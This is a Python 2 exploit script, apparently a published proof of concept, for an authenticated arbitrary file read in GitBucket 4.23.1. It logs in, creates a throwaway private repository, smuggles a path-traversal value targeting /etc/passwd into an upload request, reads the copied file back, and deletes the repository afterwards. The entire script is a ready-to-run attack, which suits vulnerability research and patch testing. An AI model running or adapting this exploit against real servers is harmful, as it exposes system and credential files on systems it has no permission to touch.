import requests
import os
import random

print "GitBucket 4.23.1 Authenticated Arbitrary File Read"
print "by Kacper Szurek"
print "https://security.szurek.pl/"

url = 'http://192.168.88.101:8080/'
user_name = "test"
password = "test"
filename = '/../../../../../../etc/passwd'

s = requests.Session()

print "[+] Try login"

login = s.post("{}signin".format(url), data={'userName': user_name, 'password': password})

if not ">Your profile<" in login.text:
	print "[-] Cannot login"
	os._exit(0)

print "Login successfully, cookie: {}".format(s.cookies.get_dict())

temp_file = s.post("{}upload/tmp".format(url), files={'file' : 'temp'})
if len(temp_file.text) < 2:
	print "[-] Cannot create temp file"
	os._exit(0)

repo_name = 'exploit{}'.format(random.randint(1, 9999999))

print "[+] Try create exploit repo: {}".format(repo_name)
create_repo = s.post("{}api/v3/user/repos".format(url), json={'name' : repo_name, 'description' : repo_name, 'private' : True, 'auto_init': True})
if not create_repo.text.startswith('{"name":"exploit'):
	print "[-] Cannot create exploit repo"
	os._exit(0)

print "[+] Run exploit"
exploit = s.post("{}{}/{}/upload".format(url, user_name, repo_name), data={'branch':'master', 'path': '', 'message': 'exploit', 'uploadFiles': "{}:exploit.txt\n".format(filename)})
if exploit.status_code != 200:
	print "[-] Error on sending exploit, probably file not exist"
	os._exit(0)

print "[+] Obtain file content"
file_content = s.get('{}{}/{}/raw/master/exploit.txt'.format(url, user_name, repo_name))

if len(file_content.text) < 2:
	print "[-] Cannot obtain file content"
	os._exit(0)

print "[+] Try cleaning"
delete = s.post("{}{}/{}/settings/delete".format(url, user_name, repo_name))
if delete.status_code != 200:
	print "[-] Cannot clean"
	
print "File output: "

print file_content.text
